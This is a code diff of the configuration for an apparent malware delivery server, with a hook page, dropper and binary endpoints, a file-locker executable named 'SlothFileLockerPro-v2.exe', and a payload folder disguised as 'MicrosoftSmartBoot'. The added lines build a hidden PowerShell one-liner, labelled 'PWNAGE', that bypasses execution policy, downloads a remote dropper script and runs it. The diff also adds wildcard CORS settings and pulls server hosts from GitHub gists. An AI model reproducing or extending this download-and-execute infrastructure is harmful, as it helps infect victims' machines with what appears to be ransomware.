@@ -2,11 +2,13 @@ import os
 import requests
 import uuid
 
+
+
 #Main Condition
 isDeployed = os.environ.get("IS_DEPLOYED","NOPE") == "YEP"
 
 #Static Mere Configs
-ServerFile = "pagesServer.py"
+ServerFile = "server.py"
 slash = "/" if isDeployed else "\\"
 _0_X_ST_URL = "https://gist.githubusercontent.com/loginrevoked-eng/9cde23712df12309d79e0e6af2f1a968/raw" 
 _0_X_ST_URL_2 = "https://gist.githubusercontent.com/loginrevoked-eng/9cde23712df12309d79e0e6af2f1a968/raw/6a4a7a952ed765bb30b9d6c35c1b051d75c18d7f/PicZ.txt"
@@ -27,6 +29,7 @@ host = "localhost" if not isDeployed else gtHost(_0_X_ST_URL,{"host":"localhost"
 
 
 #Endpoints and FILEPATHS
+payloadPathOnUserMachine = "C:\\\\MicrosoftSmartBoot"
 mainInterfaceEndpoint = "/"
 hookPageEndpoint = "/45f95d55-8681-46b0-8afa-6d87b02e01dc"
 binName = "SlothFileLockerPro-v2.exe"
@@ -42,7 +45,14 @@ def changeEndpoints():
     globals()["binEndpoint"] = "/" + str(uuid.uuid4())
     globals()["dropperEndpoint"] = "/" + str(uuid.uuid4())
 
-
+def addPowershellIWR(config: dict):
+    cmd = (
+        f'powershell -NoWindow -ExecutionPolicy Bypass -c '
+        f'"mkdir \'{payloadPathOnUserMachine}\'; cd \'{payloadPathOnUserMachine}\'; '
+        f'$s = (iwr {config["URLS"]["POWERSHELL_DROPPER_URL"]} -UseBasicParsing).Content | iex"'
+    )
+    config["OTHER"]["COMMANDS"]["POWERSHELL ONELINER PWNAGE"] = cmd
+    
 #CONVININCE WRAPPERs
 conf = {
     "IS_DEPLOYED":isDeployed,
@@ -63,14 +73,20 @@ conf = {
     },
     "USER_SIDE":{
         "PATHS":{
-            "FINAL_EXE_PAYLOAD_PATH":"C:\\\\MicrosoftSmartBoot",
+            "FINAL_EXE_PAYLOAD_PATH":payloadPathOnUserMachine,
         }
     },
     "OTHER":{
         "COMMANDS":{
-            "POWERSHELL ONELINER PWNAGE":os.environ["POWERSHELL_IWR_IWX_DROPPER_COMMAND"]
+            "POWERSHELL ONELINER PWNAGE":""
         }
+    },
+    "SERVER_CORS":{
+        "AllowedMethods":["*"],
+        "AllowedHeaders":["*"],
+        "AllowedDomains":["*"]
     }
 }
+addPowershellIWR(conf)
 
 #(lambda:print(globals()))()
